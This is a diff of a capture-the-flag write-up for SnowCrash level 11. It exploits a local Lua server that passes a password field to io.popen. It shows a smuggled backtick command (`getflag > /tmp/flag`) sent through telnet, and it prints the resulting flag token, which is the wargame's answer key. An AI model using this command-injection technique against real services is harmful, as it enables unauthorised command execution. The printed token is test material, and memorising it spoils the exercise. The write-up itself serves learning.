@@ -2,8 +2,8 @@
 
 We have a lua script:
 
-```bash
-level11@SnowCrash:~$ cat level11.lua 
+```lua
+$ cat level11.lua 
 #!/usr/bin/env lua
 local socket = require("socket")
 local server = assert(socket.bind("127.0.0.1", 5151))
@@ -40,14 +40,20 @@ while 1 do
 end
 ```
 
-Try to decode the hash and we get `NotSoEasy` so I think it's not this.
+This script runs on port 5151.
+
+Try to decode the hash, with www.dcode.fr/hash-function, and we get `NotSoEasy` so I think it's not this.
 
 Try to inject a command in `io.popen`:
 
 ```bash
-level11@SnowCrash:~$ curl -H "Password: `getflag > /tmp/flag`" 127.0.0.1:5151/
-Password: Erf nope..
-level11@SnowCrash:~$ cat /tmp/flag
-Check flag.Here is your token : 
-Nope there is no token here for you sorry. Try again :)
+$ telnet 127.0.0.1 5151
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+Password: `getflag > /tmp/flag`
+Erf nope..
+Connection closed by foreign host.
+$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
